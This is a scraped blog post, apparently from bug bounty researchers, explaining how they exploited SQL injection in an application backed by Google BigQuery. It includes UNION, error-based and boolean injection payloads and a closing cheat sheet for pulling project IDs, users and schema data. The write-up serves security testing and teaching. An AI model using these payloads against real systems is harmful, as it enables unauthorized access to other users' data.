---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-02-14_bigquery-sql-injection-cheat-sheet.md
original_filename: 2022-02-14_bigquery-sql-injection-cheat-sheet.md
title: BigQuery SQL Injection Cheat Sheet
category: documents
detected_topics:
- sqli
- command-injection
- rate-limit
- api-security
- mobile-security
tags:
- imported
- documents
- sqli
- command-injection
- rate-limit
- api-security
- mobile-security
language: en
raw_sha256: 0007bd9184230b8b00b1fc5150735f0cf7e4e3ee84fa3f3397f8724a68ccb439
text_sha256: bcfd23def55466c05469868ca924490c979f021bd1a04eb7e2650d4dc8ee08fb
ingested_at: '2026-06-28T07:32:10Z'
sensitivity: unknown
redactions_applied: false
---

# BigQuery SQL Injection Cheat Sheet

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-02-14_bigquery-sql-injection-cheat-sheet.md
- Source Type: markdown
- Detected Topics: sqli, command-injection, rate-limit, api-security, mobile-security
- Ingested At: 2026-06-28T07:32:10Z
- Redactions Applied: False
- Raw SHA256: `0007bd9184230b8b00b1fc5150735f0cf7e4e3ee84fa3f3397f8724a68ccb439`
- Text SHA256: `bcfd23def55466c05469868ca924490c979f021bd1a04eb7e2650d4dc8ee08fb`


## Content

---
title: "BigQuery SQL Injection Cheat Sheet"
url: "https://ozguralp.medium.com/bigquery-sql-injection-cheat-sheet-65ad70e11eac"
authors: ["Ozgur Alp (@ozgur_bbh)", "Anil Yuksel (@anilyukk)"]
bugs: ["SQL injection"]
publication_date: "2022-02-14"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2907
scraped_via: "browseros"
---

# BigQuery SQL Injection Cheat Sheet

BigQuery SQL Injection Cheat Sheet
Ozgur Alp
Follow
7 min read
·
Feb 14, 2022

313

Last year, we (My researcher partner on this topic, Anil and me) and found a SQL injection vulnerability on a target at Synack which was returning queries as error messages. This was quite different from the prior ones that we exploited because the back-end DBMS system was Google BigQuery.

For the ones who are not familiar with that, Google has a service named BigQuery which you can also use as a back-end database management system for your applications via their cloud system. While it is mainly similar on most of the functionalities within other SQL structures, their syntax is sometimes quite a bit different and one should get really familiarize within it especially for tricky injections.

For our case, we were a little bit lucky because on the responses we were available to see the queries within error messages on the responses, which made easier on research progress for a technology that we do not have experience with at all.

Basics of the BigQuery Technology/Syntax

Full documentation can be found via here. As a quick summary and differences within generic SQL queries, here are my observations:

There are two different query mechanisms (dialects) exist. Standard and legacy. Standard is the default one for now and legacy is the old reference that they are using. While most of the application is using standard one, old ones could still be using legacy one.
You can switch between the dialects within adding prefixes as #legacySQL and #standardSQL at the beginning of the queries, however those are working only at the beginning of the queries. So when you try to inject inside a query via SQL injection, you cannot switch between those dialects since you cannot inject at the first beginning of the query as a first line. (Unless a specific/different injection point), so this is only important to know which syntax you should use on injection.
On the legacy SQL, queries are like:
SELECT column-name FROM [project-name:dataset-name.table-name]
While it is different at standard SQL as:
SELECT column-name FROM `project-name:dataset-name.table-name`
So the main differences between those standards are legacy is using [] while standard is using `` for SELECT ... FROM ... operations.
As most of you know, on the regular SQL technologies, we have a structure as Databases -> Tables -> Columns -> Data. On the BigQuery, this is a little bit different because we can also have access to the other databases/datasets as well because technology is using cloud. So we have a structure as Project Names -> Datasets (Equivalent as database) -> Tables -> Columns -> Data.

Tricky Parts of the Identification and Data Exfiltration

For the discovery part, it was similar to regular SQL technologies and simple single quote ' did the trick which returned as a syntax error as:

Press enter or click to view image in full size
Syntax error returns with single quote

Since it was our first time to see this technology, it took us take a while to identify it as a BigQuery DBMS because the syntax is quite similar to others as well. While sqlmap was also identifying the vulnerability within error messages and boolean based queries, it was not identifying the DBMS well so exploitation should be done manually. After a little bit research, within the back-tick characters on the query such as SELECT .... FROM `` AS ... ,we figured out that it is using the BigQuery. So if you are able to see the syntax error and see FROM parts with `project_name:test.test` or [project_name:test.test] you can easily say that the DBMS is BigQuery.

Now, tricky parts comes in exploitation part:

Time based functions does not exist in the BigQuery syntax. So there are no SLEEP or WAITFOR DELAY functions exist, which makes time-based injections not possible.
Error based may work and also documented within division by zero technique such as in this blog post with the payloads such as
' OR if(1/(length((select('a')))-1)=1,true,false) OR '

but in our case it was not returning error as on the blog-post no matter how I tried. (We found another technique for error-based, which I will share later.)

So we continued with UNION based injection since UNION command was supported. Within the help of syntax error, we counted the column size of the query that injecting and created a payload as:

true) GROUP BY column_name LIMIT 1 UNION ALL SELECT (SELECT 'asd'),1,1,1,1,1,1)) AS T1 GROUP BY column_name#

Which was selecting the value of 'asd' and union-ing within the original result of the query. # character is used for commenting out of the rest of the query. This payload returned a response as:

Press enter or click to view image in full size
Union based SQL injection example

Which was a success because asd value was returning as a success result of union-ed column.

Get Ozgur Alp’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Now it was time for gathering sensitive data from the application for another user or a data which my user didn’t have access. This was even more trickier part for us because no matter which data we gathered, we were also having access via the application within our user. We after realized that application was creating a new project within all different users and for accessing other users data so there is also need to change the project name within the queries as SELECT .... FROM `different-user-id:dataset_name.table_name . This was super hard for usbecause:

Back-tick characters (`) are blocked or sanitized at the back-end of the application.
User-ids of the users were not sequential and hard to brute-force because of being 10+ digit numbers.

While those were obstacles for making this exploitation not possible, it was also possible to gather other user-ids/project-names as well within the syntax of INFORMATION_SCHEMA as well within query:

SELECT * FROM INFORMATION_SCHEMA.SCHEMATA

However in our case it was also not possible to gather them, mostly because application’s db user (session user in BigQuery) was not have access to that table too.

So after this tweet and lots of research, we found another data which does not need back-tick & have access to INFORMATION_SCHEMA table: System variables!

It was possible to exfiltrate data such as project id, job id, dataset id, timezone etc within syntax (Similar to T-SQL) such as:

true) GROUP BY column_name LIMIT 1 UNION ALL SELECT (SELECT @@project_id),1,1,1,1,1,1)) AS T1 GROUP BY column_name#

Which was returning data without any errors. While data was not too sensitive, it was still a valid PoC for exfiltrating data from dataset/database.

More Tricky Parts of the Data Exfiltration

While pure UNION technique was working on one case, on the another one it was not working because the column that I was injecting was only an integer value which was not returning string data. Because of that, we were need to exploit it within another technique.

Luckily, casting issues were also creating syntax errors in the BigQuery which was also returning as a syntax error result as well with a payload such as:

dataset_name.column_name` union all select CAST(@@project_id AS INT64) ORDER BY 1 DESC#

With the result:

Press enter or click to view image in full size
Error based BigQuery SQL injection

Which was another good technique to be used without any problems.

It should be noted that sometimes within the structure of the current query, there could be need to ad AS and/or GROUP BY clauses to tables and/or columns such as:

' GROUP BY column_name UNION ALL SELECT column_name,1,1 FROM  (select column_name AS new_name from `project_id.dataset_name.table_name`) AS A GROUP BY column_name#

More Ideas to Experiment

While those techniques were usable for our cases, it still could be needed different ideas to discover in this area. Other techniques that I tried (and failed) but could be tried on the different cases could be listed as:

Usage of different datasets: While there are no functions exist for time based functionalities, big datasets could be used to create time delays via https://cloud.google.com/bigquery/public-data with using SELECT's from different projects.
Boolean based injections (IF clauses): If statements are not working inside of the SELECT queries, hence boolean based injections would not be working perfectly as well. Our experience shows as if the query starts with WITH clause, boolean based injections are not possible. If not, SUBSTRING functionality can be used. (Full payload is below.) Still, for WITH clause, experiment for different cases could be possible and it still could be tried within different query structures. https://cloud.google.com/bigquery/docs/reference/standard-sql/scripting#if
New functionalities: Since BigQuery is a cloud based solution, escalating to this injection to other server-side vulnerabilities such as RCE does not seems possible as well. However in the future, within new functionalities or different solutions as well, different scenarios could be evaluated as well.
Playground: All commands can be easily tested at the cloud SQL workspace here: https://console.cloud.google.com/bigquery (Including the all public datasets!)

Summary to Useful Functions

Here is a summary for useful syntax/functions that you can use for exploitation:

Commenting out:select 1#from here it is not working
Commenting out 2:select 1/*between those it is not working*/
Gathering current user:select session_user()
Gathering project id:select @@project_id
Gathering all dataset names:select schema_name from INFORMATION_SCHEMA.SCHEMATA
Gathering data from specific project id & dataset:select * from `project_id.dataset_name.table_name`
Limit functions:select schema_name from INFORMATION_SCHEMA.SCHEMATA limit 1
Error based - casting:select CAST(@@project_id AS INT64)
Error based - division by zero:' OR if(1/(length((select('a')))-1)=1,true,false) OR '
Union based: UNION ALL SELECT (SELECT @@project_id),1,1,1,1,1,1)) AS T1 GROUP BY column_name#
Boolean based: ' WHERE SUBSTRING((select column_name from `project_id.dataset_name.table_name` limit 1),1,1)='A'#
Usage of public datasets example: SELECT * FROM `bigquery-public-data.covid19_open_data.covid19_open_data` LIMIT 1000
All function list:https://cloud.google.com/bigquery/docs/reference/standard-sql/functions-and-operators
Scripting statements:https://cloud.google.com/bigquery/docs/reference/standard-sql/scripting

Last Words

The targets we were working on that time were on the bonus periods and within accepted 8 reports on this we made more than 50k bounties on those, so that was a quite win and also good experience for deep diving unknown technologies! Thanks for reading and stay safe :)
